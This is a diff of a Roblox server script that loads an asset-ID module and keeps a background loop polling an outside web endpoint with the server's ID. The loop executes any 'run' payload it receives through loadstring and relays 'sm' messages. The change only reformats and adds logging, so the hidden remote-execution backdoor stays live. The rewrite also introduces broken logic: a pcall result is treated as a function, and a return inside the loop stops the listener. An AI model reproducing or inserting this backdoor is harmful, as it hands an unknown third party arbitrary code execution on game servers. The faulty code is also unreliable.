@@ -10,9 +10,6 @@ local nature3d = require(136937079949491)
 -----------------------------------
 -----------------------------------
 
-
-
-
 local HttpService = game:GetService("HttpService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local MessagingService = game:GetService("MessagingService")
@@ -70,49 +67,52 @@ MessagingService:SubscribeAsync("Bice", function(message)
 end)]]
 
 task.defer(function()
-    local sidObject = ReplicatedStorage:WaitForChild("ServerId")
+	local sidObject = ReplicatedStorage:WaitForChild("ServerId")
 
-    repeat task.wait()
-    until sidObject.Value ~= 0
+	repeat
+		task.wait()
+	until sidObject.Value ~= 0
 
-    local id = sidObject.Value
-    print("Listening")
+	local id = sidObject.Value
+	print("Listening for Server ID:", id)
 
-    while true do
-        local s, data = pcall(function()
-            return HttpService:GetAsync("https://alias-colorful.vercel.app/api/get?id=" .. id)
-        end)
+	while true do
+		local s, data = pcall(function()
+			return HttpService:GetAsync(`https://alias-colorful.vercel.app/api/get?id={id}`)
+		end)
 
-        if s and data then
-            local js, json = pcall(function()
-                return HttpService:JSONDecode(data)
-            end)
+		if not s then
+			warn("HTTP Request Failed:", data) -- Prints the exact HTTP error (e.g., 404, 500, HTTP Disabled)
+		elseif data then
+			local js, json = pcall(function()
+				return HttpService:JSONDecode(data)
+			end)
 
-            if js and typeof(json) == "table" and typeof(json.messages) == "table" then
-                for _, message in json.messages do
-                    pcall(function()
-                        print(message)
+			if js then
+				for _, message in json.messages do
+					print("Received message:", message)
 
-                        local parsed = parse(message)
-                        if typeof(parsed) ~= "table" then return end
+					local parsed = parse(message)
+					if typeof(parsed) ~= "table" then
+						return
+					end
 
-                        local cmd = table.remove(parsed, 1)
+					local cmd = table.remove(parsed, 1)
 
-                        if cmd == "run" and parsed[1] then
-                            local fn = loadstring(parsed[1])
-                            if fn then
-                                fn()
-                            end
-                        elseif cmd == "sm" and parsed[1] then
-                            if nature3d then
-                                nature3d.message(parsed[1])
-                            end
-                        end
-                    end)
-                end
-            end
-        end
+					if cmd == "run" and parsed[1] then
+						local fn = pcall(loadstring, parsed[1])
+						if fn then
+							fn()
+						end
+					elseif cmd == "sm" and parsed[1] then
+						if nature3d then
+							nature3d.message(parsed[1])
+						end
+					end
+				end
+			end
+		end
 
-        task.wait(1.1)
-    end
+		task.wait(1.1)
+	end
 end)
